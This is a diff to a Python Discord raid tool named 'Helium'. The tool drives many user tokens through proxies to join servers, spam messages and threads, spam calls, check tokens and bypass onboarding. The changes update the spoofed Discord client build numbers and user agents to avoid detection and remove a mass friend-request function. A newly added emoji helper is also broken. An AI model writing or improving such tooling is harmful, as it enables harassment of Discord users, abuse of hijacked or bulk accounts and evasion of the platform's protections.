@@ -23,7 +23,7 @@ try:
 except ModuleNotFoundError:
     os.system('title Helium - Installing dependencies')
     i = 0
-    imports = ['requests', 'colorama', 'websocket', 'websocket-client', 'threading', 'uuid', 'datetime', 'tls_client', 'time', 'colorist']
+    imports = ['requests', 'colorama', 'websocket', 'websocket-client', 'threading', 'uuid', 'datetime', 'tls_client', 'colorist']
     for _import in imports:
         i += 1
         os.system('cls')
@@ -176,12 +176,12 @@ class Render:
         title = f"""{' '*44}{Fore.RESET} Loaded ‹{Fore.LIGHTCYAN_EX}{len(tokens)}{Fore.RESET}› tokens | Loaded ‹{Fore.LIGHTCYAN_EX}{len(proxies)}{Fore.RESET}> proxies
 
 {'╭─────────────────────────────────────────────────────────────────────────────────────────────╮'.center(self.size)}
-{'│ «01» Joiner            «07» Token Formatter    «13» Voice Joiner      «19» Call Spammer     │'.center(self.size)}
-{'│ «02» Leaver            «08» Button Click       «14» Change Nickname   «20» Inviter          │'.center(self.size)}
+{'│ «01» Joiner            «07» Token Formatter    «13» Voice Joiner      «19» Inviter          │'.center(self.size)}
+{'│ «02» Leaver            «08» Button Click       «14» Change Nickname   «20» ???              │'.center(self.size)}
 {'│ «03» Spammer           «09» Accept Rules       «15» Thread Spammer    «21» ???              |'.center(self.size)}
-{'│ «04» Token Checker     «10» Guild Check        «16» Friender          «22» ???              │'.center(self.size)}
-{'│ «05» Reactor           «11» Bio Changer        «17» Typer             «23» ???              │'.center(self.size)}
-{'│ «06» Voice Raper       «12» Onliner            «18» Onboarding Bypass «24» Exit             │'.center(self.size)}
+{'│ «04» Token Checker     «10» Guild Check        «16» Typer             «22» ???              |'.center(self.size)}
+{'│ «05» Reactor           «11» Bio Changer        «17» Onboarding Bypass «23» ???              │'.center(self.size)}
+{'│ «06» Voice Raper       «12» Onliner            «18» Call Spammer      «24» Exit             │'.center(self.size)}
 {'╰─────────────────────────────────────────────────────────────────────────────────────────────╯'.center(self.size)}
 """
         for edge in edges:
@@ -450,15 +450,15 @@ class Raider:
                 "os": "Windows",
                 "browser": "Discord Client",
                 "release_channel": "stable",
-                "client_version": "1.0.9024",
+                "client_version": "1.0.9025",
                 "os_version": "10.0.19045",
                 "os_arch":"x64",
                 "app_arch":"ia32",
                 "system_locale": "en",
-                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9024 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
+                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9025 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
                 "browser_version": "22.3.26",
-                "client_build_number": 247929,
-                "native_build_number": 40010,
+                "client_build_number": 249740,
+                "native_build_number": 40353,
                 "client_event_source": None,
                 "design_id": 0,
             }
@@ -475,7 +475,7 @@ class Raider:
             "authorization": token,
             "cookie": self.cookies,
             "content-type": "application/json",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9024 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9025 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
             "x-discord-locale": "en-US",
             'x-debug-options': 'bugReporterEnabled',
             "x-super-properties": self.props,
@@ -549,6 +549,10 @@ class Raider:
 
     def emojis():
         emos = list("😀😃😄😁😆😅😂🤣😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😮‍💨😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😶‍🌫️😐😑😬🙄😯😦😧😮😲🥱😴🤤😪😵😵‍💫🤐🥴🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾😀😃😄😁😆😅😂🤣😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😮‍💨😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😶‍🌫️😐😑")
+        random.shuffle(emos)
+        emojis=""
+        for emoji in emos:
+            emojis+=emoji
         emojis = random.shuffle(emos)
         return emojis
 
@@ -576,7 +580,7 @@ class Raider:
                 case _:
                     console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
         except Exception as e:
-            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)  
+            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
     def vc_joiner(self, token, guild, channel, ws):
         try:
@@ -1354,26 +1358,6 @@ class Raider:
         except Exception as e:
             console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
-    def friender(self, token, nickname):
-        try:
-            payload = {
-                "username": nickname,
-            }
-
-            response = session.post(
-                f"https://discordapp.com/api/v9/users/@me/relationships", 
-                headers=self.headers(token), 
-                json=payload
-            )
-
-            match response.status_code:
-                case 204:
-                    print(f"{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S')}{Fore.RESET} {Fore.RESET}[{Fore.GREEN}Success{Fore.RESET}] {Fore.LIGHTBLACK_EX}-> {Fore.RESET}Sent friend {Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
-                case _:
-                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
-        except Exception as e:
-            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
-
     def onboard_bypass(self, guild_id):
         try:
             onboarding_responses_seen = {}
@@ -1492,11 +1476,10 @@ class Menu:
             "13": self.voicejoiner,
             "14": self.nick_chang,
             "15": self.thad,
-            "16": self.friend,
-            "17": self.typierq,
-            "18": self.onboard,
-            "19": self.caller,
-            "20": self.inviter,
+            "16": self.typierq,
+            "17": self.onboard,
+            "18": self.caller,
+            "19": self.inviter,
             "24": self.exit,
         }
 
@@ -1610,21 +1593,6 @@ class Menu:
             (token, channelid) for token in tokens
         ]
         self.run(self.raider.typier, args)
-
-    @wrapper
-    def friend(self):
-        with open("data/tokens.txt", "r") as f:
-            tokens = f.read().splitlines()
-        os.system('title Helium - Friender')
-        nickname = input(console.prompt("Nick"))
-        if nickname == "":
-            Menu().main_menu()
-        Clear()
-        console.render_ascii()
-        args = [
-            (token, nickname) for token in tokens
-        ]
-        self.run(self.raider.friender, args)
 
     @wrapper
     def nick_chang(self):
